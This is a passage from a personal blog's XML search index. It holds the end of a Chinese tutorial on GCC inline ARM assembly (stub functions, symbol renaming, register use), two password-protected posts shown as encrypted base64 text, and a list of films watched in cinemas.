“0”(val) \ ​ : “r3”, “cc” \ ); C 桩函数 宏定义包含的是相同的代码。这在大型routine中是不可以接受的。这种情况下最好定义个桩函数。 unsigned long ByteSwap(unsigned longval) { asm volatile ( ​ “eor r3, %1, %1, ror #16\n\t” ​ “bic r3, r3, #0x00FF0000\n\t” ​ “mov %0, %1, ror #8\n\t” ​ “eor %0, %0, r3, lsr #8” ​ : “=r” (val) ​ : “0”(val) ​ : “r3” ); return val; } 替换C变量的符号名 默认的情况下，GCC使用同函数或者变量相同的符号名。你可以使用asm声明，为汇编代码指定一个不同的符号名 unsigned long value asm(“clock”) = 3686400 这个声明告诉编译器使用了符号名clock代替了具体的值。 替换C函数的符号名 为了改变函数名，你需要一个原型声明，因为编译器不接受在函数定义中出现asm关键字。 extern long Calc(void) asm (“CALCULATE”) 调用函数calc()将会创建调用函数CALCULATE的汇编指令。 强制使用特定的寄存器 局部变量可能存储在一个寄存器中。你可以利用内嵌汇编为该变量指定一个特定的寄存器。 void Count(void) { register unsigned char counterasm(“r3”); … some code… asm volatile(“eor r3, r3,r3”); … more code… } 汇编指令“eor r3, r3, r3”，会将r3清零。Waring：该例子在到多数情况下是有问题的，因为这将和优化器相冲突。因为GCC不会预留其它寄存器。要是优化器认为该变量在以后一段时间没有使用，那么该寄存器将会被再次使用。但是编译器并没有能力去检查是否和编译器预先定义的寄存器有冲突。如果你用这种方式指定了太多的寄存器，编译器将会在代码生成的时候耗尽寄存器的。 临时使用寄存器 如果你使用了寄存器，而你没有在input或output operand传递，那么你就必须向编译器指明这些。下面的例子中使用r3作为scratch 寄存器，通过在clobber list中写r3，来让编译器得知使用该寄存器。由于ands指令跟新了状态寄存器的标志位，使用cc在clobber list中指明。 asm volatile( “ands r3, %1, #3” “\n\t” “eor %0, %0, r3” “\n\t” “addne %0, #4” : “=r” (len) : “0” (len) : “cc”, “r3” ); 最好的方法是使用桩函数并且使用局部临时变量 寄存器的用途 比较好的方法是分析编译后的汇编列表，并且学习C 编译器生成的代码。下面的列表是编译器将ARM核寄存器的典型用途，知道这些将有助于理解代码。 Register Alt. Name Usage r0 a1 First function argumentInteger function resultScratch register r1 a2 Second function argumentScratch register r2 a3 Third function argumentScratch register r3 a4 Fourth function argumentScratch register r4 v1 Register variable r5 v2 Register variable r6 v3 Register variable r7 v4 Register variable r8 v5 Register variable= r9 v6 rfpRegister variableReal frame pointer r10 sl Stack limit r11 fp Argument pointer r12 ip Temporary workspace r13 sp Stack pointer r14 lr Link register Workspace r15 pc Program counter]]></content>
  </entry>
  <entry>
    <title><![CDATA[LOVE]]></title>
    <url>%2F2019%2F05%2F27%2FLOVE%2F</url>
    <content type="text"><![CDATA[Please enter the password to read. Incorrect Password! No content to display! U2FsdGVkX1+0WyoopdYdCOhDGVGuG/6+0RLdUyF60s9bs3RpGMYnBtX/+BMAwUriPfPGBPnrPj1PxVP0lkkwWeut21YBRDYhcTwt3eGMjVBWcTex80MkVGuPC2oNEsGY2eRkmLTHJafvFpWO9dhvu3MBaCSAtHptQLhZj72NzGOtkakL6tPWpgVeAA7AbYC0WmgFXWB0KFwEd6cIX6GB+uFdQUNyEPoted55TfRLt5sq/xeYKkyeru1voXvb2k17EptZaZ0hfDjOPLx3Vml+twXb22LMzWcgaVhEH3PyH6Cm8Xmop23Vvxujz2u30PD8SDsmj9wbk4bEc+elfnSDheQCk5XWmOBh8nqoeK8FOzFhr4+q6Hcx8YTTjL5u7FMw+zfBsD9C9bSK+CAWVQBuBZkQqyPwVVTKOUU1tJiojwvQYMc5gjyJGX5K2RF3i0EI0upDZIs+fknTHUWWVO9PWbVWc9193xj/rNNfYdZIcvzGlH1Mh77avflSI01stSFkYnxTVJuSQN0ZBzndFB9/08Jt5Nq/1ypdN6sLcqeqxudBa43/B+N62/4vk587pjDgqUfjmy70kMHjueflYMk+kLam2akpHfkoUpY0aKPEeXWN+FVL/KLYEU3/R58kq9/qUbNkdymIxOYtl1lkpE25QMIs5T7uM3DFLpefa19MjrNZkHz1XmDttOTSIEXchoGmxq1Qr+wKXcCq7rNTkcaL4IRTFOVxW43PxAJLPs1xQM7PGYKYWKWieEKnXJ9fw8nWD+bzKyMF0l/FUpMLlksl+G2Q5D4UYPZVfYqa/W9d5I7ESVqwfDyGTOtk9a3weIH9axo9V/riJqiJJ2KIKGgC7xYAfEjoCNzrFwpTyWh9xFZTlERpyDYO3JjHTNjKxiX7P0W3uG/3N43FMrVIrcqI42bKeQP4dQIPUpLAPu2qpgtc/r/UYqr8Y8KJywMkDwSZnWoMHN7q7p9I87d1tpA5+bAIvbywkOrXq5MJBofbl6ljzPOLuj/QETsuY/K4s6kG5iiV10MTb/jQjawuBwsmI2ncDRB2fvkkZmrty2EgD5kmAd0yEDz8XRqvZ8IgXRfjhimueKsGm5tr4mpGOIOX9kfjazHgHhJRFqo7Cdjnz2eDhRCmK0CU8wGs2gOPnA6F25du7aGF5AhnTTVxDIi+wR1RkTs0nvbfjnbg5TmlnOKUM6tsZF3BDztkUTK89wsCWtUjiuClJvc0+yZMX0zH4ecypOYxQfBczqfLQc3RdMa82BLhG8BYUiclvkk72qhIr94rsEIIYDAXtPgzkqDen/Sm6D7GYR5nFdVb5/Azr3/874cZ1OGOrAdLPgBnHIW4FqaOqx6zDjpU+PGN+BwtXCl5EyxZnL1emv6ffatCsxJwrRYTFK86Rv2DNl2vQLTgNO3bLvs5FQ/zlp/k3RUBEPcfgKHoXpoCeVRRwfSNMWsbFQKDooem7m+vYwOX6BImQwJd5CHDANIZabrZdBR/ovjx4kre7Dc8lTno2LMUFJPByPrXlfhlA2o2mnv0gvojL1vJVYnoCS3CdRt8Y1DnVnz2D2Q8to4oWCixebkSG42fVIUFHxqdEtKgBuz0JTtm1UowvOnEOOXfEoFZTlzo0+f2mD0jsfeeyWenadesLSLdWy7gpRcpIgfDKazDpfZ+6Jdrs4r9brcW9Zxxn71EZ2kfzt6xKeGu7df1zcpaeRRSCBaXdQmV1JHvbLJOa+PSvartY51z8soajavcbbrYvXVoQ8y5QYMhrgfj11W/Ioiem0IYWZ78wJfcjlqaGIavzbf8Bg6XCB2EZ8HvBwiEQ7HldjIiDFSDTHOlyaGWEzNPAh07onb+dNgm2M9+UugY/6o0WOhY9IHR6Q4IOoufxBwX2JS/zjDFswXiqn/WjVuq9Fm4puyMuSj2LVjyX0ITtzLNix88huScxJnpeyDyNvEum5kghNMVuLq6IOoHUKUFcPgXJ9FakFu1DOT+h5o7zbjT8pdyEnsxfy4hUYMrkviczvwLDRF2TCnNZvr/ao6m420PRiFA4Z8mCI20LR57ujhmBt0yXd2jK/jjopqm/r01MABqAFSBCPR8G/fAMdXuIHb/90gFgqepGngKBGV7ooPRAe/+Si8V1KYwliefgG8MTxSaKI3nSbonuACpM+v/QKzfodGpOSX85SBzFK53mAg585J2QMp6tO0DDnHeODugbmB71bnWvFCdPFGX4wIfatZiMxHH7WEm2ckfIyiqLqLUr8EVJHi73kYrFoX4ntfRjHbbtL9nwYyFZP80qKxDqnWFK4WjYjq5j81cEeygzux0bgy9VGYtKt7J1dhbGBXl1Pc42jWqD+ZYpcnfiTGtKb4eSPH6mrqnFMV3rzmdO1d98s11yKWhPygsNzLmpIWz/QMt9pupWkRAmFpflHeYJxG11ZB4W6eGjab6KguC++nZoCH5xpWwhXZXTcaMk+hXdwK6PicH7wiGW5spgq+ifLzr6DeVBFEUT6sWo2IiBs4FmsP1KpRYuejqvKDeXZR95kJE6MI6OMwTnveUbKWFgci3ybTDJdeRmjj0FPxhvU1mZbpVN9MueDNWhE5unJhZuMAUuZG18ZKJxk52bKQ36XTUm0RGT15EoJQM88KUrjrhMdcBVYV4n5NIMAVCPZoq4mnBxeK2RaLVBduvoFpNFGHYnjHWX8VLtJZAnnDj+ekwSfYtyvMS/sDhvTSx5s4ykwqwo2XiXGtcEfhqfS5l+yudHMu95LBIVwUJkQ7CUQaoV5f+tsi0UNHnfRBlAQKbSI60RhZm/wA9mUzcytoO2OlyRBt2xSNYeQWD5nJMvCI3rmiZ8Y9N9WFHC4p3w2nmm5xnAGlxotpg8rVKq1Mdng3KfyM8xLTdR40YTdjp1l0jylIgOebDZGLG7edeeD6H+6CisCsmBALSMiXwuOUEpF1dLapzdfyYjqu/Xb/8PAP+OzTdjPsQSSCMa0F1Iw60Ife48F+bcBK6rPSmEgT7IHoQR/y0dcu+fBTB/T3ApmPMe9BFxVS8AVA3ObaH8W6ABNCqBLGsy0iizOAnYRVd3YGynRGwLiKGO4mAmz2ZuXqVCuOB4cBMa/qYyIf3wmWAwqB8XgyzG8wNufSbxy53ulS0d0UR59Nu+/52QYFy2j+fj7LqfBxd9UUda7HxkPS6r4tnDIoaUeETgl75tbR9EzXKEJwnnSJLX6wU2OXw4J4+w/aHhSXkktGLP1txWUFxGz2W1sQF2JSXccHgLHCu5gDvlMzabzTjhqwP/xXkECt/S1X5UxbfcWqkkN2K05/bnBRwQMGm1eeolHrd7rcjWkg1VYQB4qTbst1ih9zw0eNqk37kLHz4P98eqdwFsaD3XDvb1Bu780rfTGA3AygqfIPfl/avC3Ok4M/QtpjyBj+OlzpfIf4Z4Je4kpxVRoJDpU0U0P0gUtinVkog4KCFv9huzEzOeLjPEL0CAm4RDZAISeoLeKLkBKLF6KjhOcu1IwMqn6RW9ufa9/+8q65HE5/93StNwE0YiHANTEMs5QZoPBgZXvFVxpQrXUIK+Vdjh2qFJ68k2NvUL0obOYKzcbZ71STPyFswaPxptPg+bj+SrbuWiYH9oRVEY750Rml+8Mko4k4J6WGbcvonKhEsTN+IPLS2+F8Zm14kMtqs4riSChQk7xPc6Tj3EzMIb97xj2mqaGH8UJlFJYUEloj11wak0htnvmvGGBOoESt1FDDH7EOcxi2BISgLSiSTRri74P5g0fpS4s2V0kF1NC+KF4CQ8JN/9WaQhSQrOKpQaodHRzxTMNWfs0/aeeLkFEYogx5c44GlKMx9JrJomNMr6cq0ubDz/3fbk/meqj1mixQV6hnn3RG6O29AQBoBbDoCHzUZhEeCUjyb6Myz/cRfLNPKeXOa8AIkvGnHlZ4a3U2keoCx0elARn1vVxzMOxnCdqOcaCm3oPkNnnP7Cc+KV52ptIQMX16Rh2rTgokl8mIR9VRr2m1CuI/eHqLaqmEtZgsd425kolzAdMQo0CQ5JZDEUWdATeaYDFboqArgW/qmgdDgEyTq/tHwBwpeClp1qlve91tzjeZyqR9js77YWSP1VQlc64LtA8pbYkWHlFI1C2mxjZ0vfyhjJ0dkk885S319XwI7G3mh6PaISk/YFySUP1FGFbZc5gGp8Wv+O0p8QvEkNwxG/rvWPzpbydwnbrmXpW9z7NuTdPtz3wI0kYijj+HQ27/2dCgoOWiuK6Jv8vhVffX9xZ6G7ifukYHY6dLq22xImJr09hh2GdPfbJX7HiyGYvTiMNxYBm8oy31Jr0Ylh1vEToeEN7LmStP53Gr+GX8e8ZAsHaOlmTd4vjLKlw2qqaBln0RNLJEW/8a3fT/HoN60qhpce0jI0lzBzaRJHKPJA751PWIwkVOc0bmRuSFoh0ZrtzVuvB16FqXaH48lSO5faI3/6JWsQiB3Scgp4W3o1Bc4rGSPCKBoKpf64e4n4f1ltc8vUACdZrLC2J9OnbfyI+prC0crnlRHzjuqAKvz/gEpy2C+uGlvOFkSK1bmbr0T4QSik4AM/Us6otarilhpwBjGM/mBgx1LZNaXIJ9+SyS47QoW51FWvqqMB2y8n6qA+7drlSjaYNLInid2notC8nnIhVb+7CFxUdmn25yUaKLSuLOKKUH9WTcIlhEITJAprEFszuccFqGyv0yWdFsaCuB3nRuorq7V8HQBDTjS3337hTJQEspx+9DyO/qtNngEe+1uE8hWhrG1I2ErqvXzsS6OE+ZC+JQSc91mzINFDGqDViwl6XI/bsqjaIp5qzotvEEr06RXxRYQNJ/XIREwz5pQHtBVqq/gdNGEYFqUcB5VpYS8aofAn0HQF4+0K6CGKPMl0xQiv2bdvIOvU9op+89YXx4rjcWqzntxjGjYYDxiAFdOhwM1/ppxpgvfTDG8n3X4dCiQHOLRzcNvTgpD6hqDZBQRUo0yrghRZasVwtDr9IF6qw9TPUUjQNSQiayA7THXbtBfmBzwfg4aJgxObuZ5gm5Vl4pHLN+rPVc2IV8PvbDLtbGEQyzt6jh+5aUBklnD/2BwH7dO8SqUQaGHNgqMqNahTJ5RFxmEHeFIljXVi0g9CxxZQ2vdIeJNrKEOkQi8anh5n8vDWzdL3WfdmwBk9HrfEoDWOwSWGqEs0BUl8Lls15QR/n3kNu7J3r47g0xRgmYeBxk0fCDmXiPcDhf0feGUgr1Q6segSxY9Jyno5vl7DDA5g2fr59vUssADUjvKIj0Bun9D0Xrb0yUaxrmtxXbJh5Q8Aa/AZpQITQGyYPkLU0d7n20wnXwvf2FvK4IFH6/E4OOX94vrBNjmvc+XxjvDODRfseEB386lRiLZxQHZEksjfh/moeUt4r8CqAw9NQAD7aPPkeXUp/zMEO2h0pF2CiUXQGxADjiAaQaS6lb2ykGjKe9rnah1fgTPApWYrsrM/ENitqsvvafHYLjB7m9Hsyq9YzEpVRql5sTfWEHsIp8g5UDLWM+Wa2zZmf8mIXvGoNFBBcqxV5ffIjdjk1D3zgyPjfelhp/OTNcYuQtVp9nFP+xZI0GH3Oj9HRlWEjqMm4FdZvOKNUnrXWej5czfXAfuzMPTJIW4vhmEOksDV0BdCoaHNsXxD13hpK+zuRFeGQG0994jwlZuId1bGKe9Z/s07q0I2kykag7h01DjCR/TI9AOdCQxwfXeo9HnqQzkdrqwKovqNFK5UxxDN2bkeR5xelJ/ES0XB2p36rZqJZNzfptnmimNry7rv04Obg+LG8chFLvOUzKLWRDoqpuTVfQlifP8oMpARTzG6KV1ZkAc5FygphPkd89UdRW8kDfgg6dxXAX8+OroXDrJlstMkm0wOmyJu0b/osvlJFyuXYX3yLflTZPoQud9FldKfZD5vPO/KFMNM+kQ2AUsMAt33k5UDdpzcL0s1MUf2JJnsT2LhaO5KosVrbjPSUERajZUppZuvI1e8k5ZBCAlSFTXylj0PBaA6KEoOOlUhmkmpIc/KihDPaS3sU5MKzYtpptRuMMtpgZE5lOg0TxLz4g+KBmEBuDqNPDRpYLA1FDgo/Hc9PGj38FZQ5VV3VdXIWgZK0M54tkQGLf1X6zWBM7iqmZwhtSyN31JW3mdgwq6LyX53uVlCWhS7GwkD3QQnvwow62LkfsptYpcveNe5sCkrvViZIUpdD97OPtR2sPJgADQxEeSxtqoRWOBHOVXqOQIsFqjvy9GtBE0ZH1Mc9Wg1iX/YhaHyX1A/zeF8UnTyvEg/Z3epZKCowW33hsLjKV2fZ5wp2+uDSqadcTJ1K5CdzQuq4JXB9Vrz0HY3kJe/eY29PKlGcDP8IJ7ap/M8xF6XdHrQmoXVPXVVRyfOuAskIf1mJ5fF/S/wly8xbeUQozpL5jNXejdPZ8Xx/LTnmMaUU2uwxlD9bIWmNx5X1heFLPcLEZMoFbVRw5bkxT+HhdQzXa/2KrSFlA/8UV51tM6TjkglUbnN6TRNF0QSMCY18Ukw1Iu4P4jcKoryVi/3BQlC/EAfmURD3YwRmMxXv3TxcNoZtFG5rlPexTAaFMBK0THr7+izurU+lCiYe8mY44odn0CE7yGHEeLRJA97jDKR/ystpywn7TKllVU3fv1JtEDGMZPTD9MxU65Eawld2IFy44aa0IDOVUVdj5RXRykUuo7Ocvd+mfNJ3kbi1fCODrzzOBSv4Xi4E1clOqbPCNLenPt6nOvkHwAWLC4hpjnDIxXMpaPWhgGWD5OyZ0iu76z6yAl7gfioPVJI8gkI8EHbCMR11adMCxApuoRzi6T4sR8tTP2Rd/v6NCWJWEjRgFdrlHEdcxuQwvY7OpwmAli9y+9ziZStuKqC2+/7tfTTPNINLjZUznpJrH2WXz+9bs5nVBXGVTCsUfmfO3PC4yFeIOx5eEXklh2AbQ3aw6Rh2BvVbEUw5lYhzYtot/ID+f8R8RAsexBu0lSUONV7lpVEHSLdVKOdAQRnPW1WqNmJwl2+Lwmsqft1+2xyjpqX98fMXpLrahmQwG+JvePzZVZ6v1smlQMzFElWKyZMpbaxwSKbiHW7kBgMK2ESDFr6LXqf5FZJJ6rtoh/CLu7J6GYkgjZ2xdkeTLAxqc4+vTtxuPT4OSNadaSzKq1wFZPr7x+pGRtgDD/aa4Nx4LSnptXAOhZFUeDGy+OpQx+EjV3WwHTQ0OTmSB6UitTQSWYR3iLyiH9dVpHDyckPhqZRVjCtgAfy1nja7jtmlCqZ2BRVT7kq6o8SYJlbd1wVP2uoGcFpXG3a372a6tjdVrNEKpOgdloVsflKK/JMQgcHoQQfIfYwYC1CaorTQxMva2DS8//MzSgWCBKjdNrSJkEEBr0RKc6w9DZhJ6L9lGLNVOim677974QrdOJBkTH+seDfy7MzoKulGV1a61KeXGDlisvAw/B2g8Y+Lli1MZyaPLXIJoVQqo5MqHod2rGvIB+e+QkDhVc8FZS6w0O0ED/+Tx/7wbyLhb+QQvi4SdN09Pb04dZVeXhBiu7YCDyCQ/Cul9HwCOsW0URglOE18DfVnlcNi0xsb0cpW0BXasf4mcnSvRcBKZxxSV6+qFnCQP+/KM3u66eh4PUtuHYM8R/mKsNSYnh06HcySwVFfO2XWIhr9vJBcBem48Al5yybJIs8y/k1cvVtDm/eY7yc3H26gLsSOulr6y0ZvQzm8gddg/CYEGzV4LePV/QBZpMATwa4xYE4uDh9EVwgXRqF71ARZAir4Kh3AwfRcqGvaUL2qi7+pGTxVQ3O2y3tK8fH9jqbocAKMNn6vg3Uq7ds1OjJcUUTzP11HxLLpz9zwxkTDNS5CzrxUXZToDfJ7FxKhOWoT6DJPX68GVMGUouV3Zy7fVdSVN5MlRyJVBE08zfgNbUqOFY3D0ar4LDni3qTyD7CwSjInbC3929lgR6Hk9uNRVjZ0AsBwMTv7ybQWy0M4/ojwk35WLGxK+5ndwBUFPGgB00JJBjw/CyWK3oDwII2cH7ahgazFJ+lH6GYIkR0qTjaHk/xrrgDO8Lx+qbYYecFNOyhUGZE78Gy4Ozg8TOLoBDjfBoINISMAg120LsK9D6DTXVwsWa4L/wBg3Xl8ZVS6J5ALA6MpJAscdkW8INLjwvHzC58jZ0zix8nZLYCSaY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Movie]]></title>
    <url>%2F2019%2F05%2F27%2FMovie%2F</url>
    <content type="text"><![CDATA[To the movieIn the wanda 战狼2 空天猎 极致追击 英伦对决 看不见的客人 羞羞的铁拳 天才枪手 王牌特工2：黄金圈 银翼杀手2049 全球风暴 雷神3：诸神黄昏 精灵宝可梦： 波尔凯尼恩与机巧的马机雅娜 正义联盟 恐袭波士顿 推理笔记 烟花 寻梦环游记 巨额来电 帕丁顿熊2 鲨海 奇门遁甲 心理罪之城市之光 芳华 疯狂特警队 妖猫传 机器之血 妖铃铃 前任3： 再见前任 二代妖精之今生有幸 星球大战：最后的绝地武士 勇敢者游戏： 决战丛林 无问西东 谜巢 英雄本色2018 神秘巨星 移动迷宫3： 死亡解药 绝命时钟2：22 24小时：末路重生 忌日快乐 南极之恋 唐人街探案2 红海行动 捉妖记2 小萝莉的猴神大叔 黑豹 解忧杂货店 古墓丽影：起源之战 环太平洋：雷霆再起 头号玩家 通勤营救 起跑线 湮灭 脱单告急 幕后玩家 后来的我们 哆啦A梦：大雄的金银岛 复仇者联盟3：无限战争 超时空同居 游侠索罗：星球大战外传 深海越狱 侏罗纪世界2 超人总动员2 龙虾刑警 金蝉脱壳2 我不是药神 动物世界 邪不压正 摩天营救 西虹市首富 解码游戏 爱情公寓 一出好戏 快把我哥带走 欧洲攻略 蚁人2：黄蜂女现身 碟中谍6：全面瓦解 阿尔法：狼伴归途 反贪风暴3 影 无双 李茶的姑妈 我的间谍前男友 铁血战士 昨日青空 毒液：致命守护者 你好，之华 冰封侠：时空行者 飓风奇劫 名侦探柯南： 零的执行人 神奇动物： 格林德沃之罪 无敌破坏王2：大闹互联网 憨豆特工3 无名之辈 海王 龙猫 网络迷踪 天气预爆 来电狂响 蜘蛛侠：平行宇宙 地球最后的夜晚 大黄蜂 “大”人物 命运之夜——天之杯：恶兆之花 白蛇：缘起 密室逃生 死侍2：我爱我家 掠食城市 廉政风云4 流浪地球 疯狂外星人 飞驰人生 一吻定情 阿丽塔：战斗天使 驯龙高手3 惊奇队长 过春天 比悲伤更悲伤的故事 波西米亚狂想曲 乐高大电影2 海市蜃楼 反贪风暴4 风中有朵雨做的云 雷霆沙赞！ 复仇者联盟4： 终局之战 祈祷落幕时 调音师 何以为家 大侦探皮卡丘 阿拉丁 哥斯拉2：怪兽之王 哆啦A梦：大雄的月球探险 X战警：黑凤凰 追龙II 绝杀慕尼黑 秦明·生死语者 黑衣人：全球追缉 玩具总动员4 千与千寻 蜘蛛侠：英雄远征 扫毒2：天地对决 爱宠大机密2 哪吒之魔童降世 烈火英雄 使徒行者2：碟影行动 沉默的证人 全职高手之巅峰荣耀 愤怒的小鸟2 铤而走险 罗小黑战记 检察方的罪人 宝莱坞机器人2.0：重生归来 罗小黑战记 名侦探柯南：绀青之拳 诛仙I 小Q 友情以上 中国机长 我和我的祖国 攀登者 犯罪现场 航海王：狂热行动 双子杀手 沉睡魔咒2 少年的你 天气之子 终结者：黑暗命运 受益人 霹雳娇娃 海上钢琴师 冰雪奇缘2 冰峰暴 两只老虎 勇敢者游戏2：再战巅峰 误杀 星球大战：天行者崛起 叶问4：完结篇 特警队 宠爱 亲爱的新年好 天使陷落 美丽人生 变身特工 为家而战 紫罗兰永恒花园外传：永远与自动手记人偶 灭绝]]></content>
  </entry>
  <entry>
    <title><![CDATA[Magic]]></title>
    <url>%2F2019%2F05%2F20%2FMagic%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read. Incorrect Password! No content to display! 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